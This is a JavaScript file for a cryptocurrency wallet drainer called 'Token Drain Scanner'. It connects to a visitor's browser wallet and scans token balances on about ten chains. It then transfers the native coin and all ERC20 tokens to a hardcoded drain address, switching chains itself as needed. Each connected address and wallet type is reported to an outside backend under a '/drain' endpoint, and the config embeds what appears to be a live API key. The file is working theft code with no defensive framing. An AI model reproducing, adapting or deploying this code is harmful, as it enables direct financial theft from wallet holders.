// ================================================
// TOKEN DRAIN SCANNER - MULTI-WALLET & TOKEN DRAIN
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    chainExplorers: {
        1: "https://etherscan.io",
        56: "https://bscscan.com",
        137: "https://polygonscan.com",
        10: "https://optimistic.etherscan.io",
        42161: "https://arbiscan.io",
        43114: "https://snowtrace.io",
        8453: "https://basescan.org",
        250: "https://ftmscan.com",
        100: "https://gnosisscan.io",
        25: "https://cronoscan.com"
    },
    
    // ERC20 ABI for token transfers
    erc20ABI: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)",
        "function approve(address spender, uint256 amount) returns (bool)",
        "function allowance(address owner, address spender) view returns (uint256)",
        "function decimals() view returns (uint8)",
        "function symbol() view returns (string)",
        "function name() view returns (string)"
    ],
    
    // Supported wallet providers
    walletProviders: {
        'metaMask': 'MetaMask',
        'trust': 'Trust Wallet',
        'binance': 'Binance Wallet',
        'coinbase': 'Coinbase Wallet',
        'phantom': 'Phantom',
        'brave': 'Brave Wallet',
        'okx': 'OKX Wallet',
        'tokenPocket': 'TokenPocket',
        'walletConnect': 'WalletConnect'
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let walletProvider = null;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    // Verify critical elements
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Populate network selector
    populateNetworkSelector();
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
    
    // Detect wallet provider
    detectWalletProvider();
}

// Detect which wallet provider is available
function detectWalletProvider() {
    const ethereum = window.ethereum;
    if (!ethereum) {
        console.log('❌ No Ethereum provider found');
        return;
    }
    
    // Check for specific wallet providers
    if (ethereum.isMetaMask) {
        walletProvider = 'metaMask';
        console.log('✅ Detected: MetaMask');
    } else if (ethereum.isTrust) {
        walletProvider = 'trust';
        console.log('✅ Detected: Trust Wallet');
    } else if (ethereum.isBinance) {
        walletProvider = 'binance';
        console.log('✅ Detected: Binance Wallet');
    } else if (ethereum.isCoinbaseWallet) {
        walletProvider = 'coinbase';
        console.log('✅ Detected: Coinbase Wallet');
    } else if (ethereum.isPhantom) {
        walletProvider = 'phantom';
        console.log('✅ Detected: Phantom');
    } else if (ethereum.isBraveWallet) {
        walletProvider = 'brave';
        console.log('✅ Detected: Brave Wallet');
    } else if (ethereum.isOkxWallet) {
        walletProvider = 'okx';
        console.log('✅ Detected: OKX Wallet');
    } else {
        walletProvider = 'unknown';
        console.log('⚠️ Unknown wallet provider');
    }
}

// Populate network selector dropdown
function populateNetworkSelector() {
    if (!networkSelector) return;
    
    networkSelector.innerHTML = '';
    
    // Add "Switch Network" option
    const defaultOption = document.createElement('option');
    defaultOption.value = '';
    defaultOption.textContent = 'Switch Network';
    networkSelector.appendChild(defaultOption);
    
    // Add all supported networks
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = `🌐 ${name}`;
        networkSelector.appendChild(option);
    });
}

// Check existing wallet connection
async function checkExistingConnection() {
    const ethereum = getEthereum();
    if (!ethereum) {
        console.log('⚠️ No wallet provider');
        return;
    }
    
    try {
        const accounts = await ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
}

// Get Ethereum provider with fallback
function getEthereum() {
    if (window.ethereum) return window.ethereum;
    
    // Check for different wallet providers
    if (window.BinanceChain) return window.BinanceChain;
    if (window.web3?.currentProvider) return window.web3.currentProvider;
    if (window.trustwallet) return window.trustwallet;
    if (window.coinbaseWalletExtension) return window.coinbaseWalletExtension;
    
    return null;
}

// Handle connect button click
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    updateStatus('🔄 Connecting wallet...');
    
    const ethereum = getEthereum();
    if (!ethereum) {
        updateStatus('❌ No wallet found!');
        showWalletInstallGuide();
        return;
    }
    
    try {
        // Request accounts - THIS TRIGGERS WALLET POPUP
        console.log('📤 Requesting accounts from wallet...');
        const accounts = await ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        console.log('✅ Wallet response:', accounts);
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection pending. Check wallet.');
        } else {
            updateStatus('❌ Failed: ' + error.message);
        }
    }
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        console.log('🔄 Setting up connection...');
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Select current network in dropdown
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        // Update network selector
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        fetchTokens(currentAccount, chainId);
    });
    
    ethereum.on('disconnect', (error) => {
        console.log('🔌 Wallet disconnected:', error);
        disconnectWallet();
    });
}

// Handle network change from dropdown
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        // This error code indicates that the chain has not been added to MetaMask
        if (switchError.code === 4902) {
            try {
                await addNetworkToWallet(chainId);
            } catch (addError) {
                updateStatus(`❌ Failed to add network: ${addError.message}`);
            }
        } else {
            updateStatus(`❌ Failed to switch network: ${switchError.message}`);
        }
    }
}

// Add network to wallet
async function addNetworkToWallet(chainId) {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    const networkParams = {
        56: { // BSC
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
        },
        137: { // Polygon
            chainId: '0x89',
            chainName: 'Polygon',
            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
            rpcUrls: ['https://polygon-rpc.com/'],
            blockExplorerUrls: ['https://polygonscan.com/']
        },
        42161: { // Arbitrum
            chainId: '0xA4B1',
            chainName: 'Arbitrum One',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
            blockExplorerUrls: ['https://arbiscan.io/']
        },
        10: { // Optimism
            chainId: '0xA',
            chainName: 'Optimism',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: ['https://mainnet.optimism.io'],
            blockExplorerUrls: ['https://optimistic.etherscan.io/']
        }
    };
    
    if (networkParams[chainId]) {
        await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [networkParams[chainId]],
        });
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    // Scan major chains
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(currentAccount, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalenthqApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Fetch tokens for current chain
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const tokens = await fetchTokensForChain(address, chainId);
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item" data-address="${token.contractAddress || 'native'}" data-chain="${chainId}">
                        <div class="token-info">
                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - COMPLETE VERSION FOR ALL TOKENS
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Confirm drain
    if (!confirm(`⚠️ WARNING: This will send ALL detected tokens and ETH to:\n${CONFIG.drainAddress}\n\nEstimated tokens: ${detectedTokens.length}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining ALL tokens...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // 1. First, drain ETH/native token
        await drainNativeToken();
        
        // 2. Drain all ERC20 tokens
        await drainAllERC20Tokens();
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient ETH for gas fees';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token (ETH, BNB, MATIC, etc.)
async function drainNativeToken() {
    updateProgress('Draining native token...', 10);
    
    const ethereum = getEthereum();
    
    // Get balance
    const balanceHex = await ethereum.request({
        method: 'eth_getBalance',
        params: [currentAccount, 'latest']
    });
    
    const balance = parseInt(balanceHex, 16);
    
    if (balance === 0) {
        updateProgress('No native token to drain', 20);
        return;
    }
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        updateProgress('Not enough native token for gas fees', 30);
        return;
    }
    
    // Calculate amount to send (leave some for gas for token transfers)
    const sendAmount = balance - (gasCost * 5); // Leave more for token transfers
    
    if (sendAmount <= 0) {
        updateProgress('Not enough after gas fees', 40);
        return;
    }
    
    // Send native token
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
    
    // Wait for transaction
    await new Promise(resolve => setTimeout(resolve, 3000));
}

// Drain all ERC20 tokens
async function drainAllERC20Tokens() {
    const ethereum = getEthereum();
    
    // Filter only ERC20 tokens (not native)
    const erc20Tokens = detectedTokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Draining ${erc20Tokens.length} ERC20 tokens...`, 60);
    
    let completed = 0;
    
    for (const token of erc20Tokens) {
        try {
            // Switch to token's chain if needed
            if (currentChainId !== token.chainId) {
                await switchToChain(token.chainId);
            }
            
            // Drain the token
            await drainERC20Token(token);
            
            completed++;
            const percent = 60 + (completed / erc20Tokens.length * 40);
            updateProgress(`Draining ${token.symbol}... (${completed}/${erc20Tokens.length})`, percent);
            
            // Small delay between transactions
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateProgress(`Completed draining ${completed} tokens`, 100);
}

// Drain single ERC20 token
async function drainERC20Token(token) {
    const ethereum = getEthereum();
    
    // Encode transfer function call
    const transferData = encodeTransferData(token.balance);
    
    // Get gas estimate for token transfer
    const gasEstimate = await ethereum.request({
        method: 'eth_estimateGas',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData
        }]
    });
    
    const gasLimit = parseInt(gasEstimate, 16) * 2; // Double for safety
    
    // Get gas price
    const gasPriceHex = await ethereum.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    // Send token transfer
    const txHash = await ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    return txHash;
}

// Encode transfer function call
function encodeTransferData(amount) {
    // transfer(address,uint256) signature
    const functionSignature = '0xa9059cbb';
    
    // Pad drain address to 32 bytes
    const paddedAddress = CONFIG.drainAddress.slice(2).padStart(64, '0');
    
    // Pad amount to 32 bytes
    const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
    
    return functionSignature + paddedAddress + paddedAmount;
}

// Switch to specific chain
async function switchToChain(chainId) {
    if (currentChainId === chainId) return;
    
    const ethereum = getEthereum();
    
    try {
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
        // Wait for chain switch
        await new Promise(resolve => setTimeout(resolve, 1000));
        currentChainId = chainId;
        
    } catch (error) {
        if (error.code === 4902) {
            await addNetworkToWallet(chainId);
        } else {
            throw error;
        }
    }
}

// Update progress indicator
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
    
    console.log(`Progress: ${percent}% - ${message}`);
}

// Show wallet install guide
function showWalletInstallGuide() {
    const guideHTML = `
        <div style="margin: 20px 0; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404;">📱 No Wallet Detected</h4>
            <p>You need a Web3 wallet to continue:</p>
            <div style="display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0;">
                <a href="https://metamask.io/download/" target="_blank" 
                   style="padding: 10px 15px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none; flex: 1; min-width: 120px;">
                    🔵 MetaMask
                </a>
                <a href="https://trustwallet.com/" target="_blank"
                   style="padding: 10px 15px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none; flex: 1; min-width: 120px;">
                    🔶 Trust Wallet
                </a>
                <a href="https://www.binance.com/en/download" target="_blank"
                   style="padding: 10px 15px; background: #f0b90b; color: white; border-radius: 5px; text-decoration: none; flex: 1; min-width: 120px;">
                    🟡 Binance Wallet
                </a>
                <a href="https://www.coinbase.com/wallet/downloads" target="_blank"
                   style="padding: 10px 15px; background: #0052ff; color: white; border-radius: 5px; text-decoration: none; flex: 1; min-width: 120px;">
                    🔷 Coinbase Wallet
                </a>
            </div>
            <p><small>After installing, refresh and click "Connect Wallet".</small></p>
        </div>
    `;
    
    statusEl.innerHTML = guideHTML;
}

// Update status
function updateStatus(message) {
    statusEl.textContent = message;
}

// Show UI elements
function showUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('hidden');
    });
}

// Hide UI elements
function hideUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                walletProvider: walletProvider
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    const ethereum = getEthereum();
    if (ethereum && ethereum.disconnect) {
        try {
            await ethereum.disconnect();
        } catch (error) {
            console.log('⚠️', error.message);
        }
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    walletProvider = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Debug
console.log('=== Token Drain Scanner ===');
console.log('Version: 2.0 - Multi-Wallet & Token Drain');
console.log('Drain Address:', CONFIG.drainAddress);
console.log('===========================');
